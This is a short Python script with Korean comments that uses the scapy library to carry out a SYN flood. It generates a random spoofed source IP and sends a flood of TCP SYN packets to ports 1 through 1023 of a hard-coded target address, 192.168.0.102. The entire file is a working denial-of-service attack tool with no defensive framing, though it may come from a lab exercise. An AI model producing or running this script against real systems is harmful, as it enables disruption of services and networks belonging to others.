#Random IP에서 Target IP의 1~1024포트에 TCP 연결 요청
from scapy.all import *
from random import shuffle

#0.0.0.0 ~ 255.255.255.255 사이의 IP주소 리턴
def getRandomIP():
	ipfactors = [x for x in range(256)]
	tmpip = []
	for i in range(4):
		shuffle(ipfactors)
		tmpip.append(str(ipfactors[0]))
	randomip = '.'.join(tmpip)
	return randomip


#SYN Flooding 수행
def synAttack(targetip):
	srcip = getRandomIP()
	P_IP = IP(src=srcip, dst=targetip)
	P_TCP = TCP(dport=range(1,1024), flags='S')
	packet = P_IP/P_TCP
	srflood(packet)
	

def main():
	targetip = '192.168.0.102'
	synAttack(targetip)
	
if __name__ == '__main__':
	main()
